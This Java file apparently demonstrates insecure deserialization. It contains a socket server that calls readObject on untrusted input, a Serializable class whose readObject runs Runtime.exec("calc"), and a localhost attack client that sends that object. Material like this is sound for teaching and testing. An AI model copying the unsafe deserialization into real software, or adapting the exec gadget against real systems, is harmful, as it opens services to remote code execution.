import java.io.*;
import java.net.*;

class VulnerableService {
    public static void main(String[] args) {
        try (ServerSocket ss = new ServerSocket(8888)) {
            System.out.println("Server started on port 8888");
            while (true) {
                Socket socket = ss.accept();
                new Thread(() -> handleClient(socket)).start();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void handleClient(Socket socket) {
        try (ObjectInputStream ois = new ObjectInputStream(socket.getInputStream())) {
            System.out.println("Processing client request...");
            // Vulnerable deserialization
            Object obj = ois.readObject();
            System.out.println("Received object: " + obj);
        } catch (Exception e) {
            System.err.println("Error handling request: " + e.getMessage());
        }
    }
}

class MaliciousData implements Serializable {
    private String username;
    private transient String sensitiveData;

    public MaliciousData(String username) {
        this.username = username;
        this.sensitiveData = "secret_api_key_12345";
    }

    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        // Simulate malicious code execution
        Runtime.getRuntime().exec("calc"); // Vulnerable method
    }

    @Override
    public String toString() {
        return "User: " + username + ", Data: " + sensitiveData;
    }
}

// Attack simulation client
class AttackClient {
    public static void main(String[] args) throws Exception {
        Socket socket = new Socket("localhost", 8888);
        ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
        oos.writeObject(new MaliciousData("attacker"));
        oos.flush();
        oos.close();
    }
}